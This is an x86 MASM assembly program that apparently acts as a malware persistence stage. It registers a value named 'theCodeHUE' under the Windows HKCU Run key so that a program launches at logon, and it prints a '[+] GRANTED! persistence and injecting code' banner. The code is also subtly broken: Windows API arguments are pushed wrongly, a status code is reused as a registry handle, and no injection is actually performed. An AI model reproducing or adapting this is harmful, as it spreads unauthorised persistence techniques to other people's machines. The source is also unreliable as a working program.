include windows.inc
include kernel32.inc
includelib kernel32.lib

.data
    key_path db 'Software\Microsoft\Windows\CurrentVersion\Run', 0
    value_name db 'theCodeHUE', 0
    granted db '[+] GRANTED! persistence and injecting code...!', 0
    len equ $ - granted
    buffer db 256 dup(0)

.code
main PROC
    call    GetCommandLineA
    mov     esi, eax
    lea     edi, buffer
    call    ParseCommandLine

    push    KEY_SET_VALUE
    push    0
    push    offset key_path
    push    HKEY_CURRENT_USER
    call    RegOpenKeyExA
    mov     ebx, eax

modify_reg:
    push    0
    push    eax
    push    offset buffer
    push    offset value_name
    push    REG_SZ
    push    ebx
    call    RegSetValueExA

    push    offset granted
    call    StdOut

    push    ebx
    call    RegCloseKey

    push    0
    call    ExitProcess
main ENDP

ParseCommandLine PROC
    mov     al, [esi]
    inc     esi
    mov     al, [esi]
    inc     esi
    mov     ecx, buffer
parse_loop:
    lodsb
    stosb
    cmp     al, 0
    jne     parse_loop
    ret
ParseCommandLine ENDP

StdOut PROC
    call    GetStdHandle
    mov     ebx, eax

    push    0
    push    len
    push    offset granted
    push    ebx
    call    WriteFile

    ret
StdOut ENDP

END main
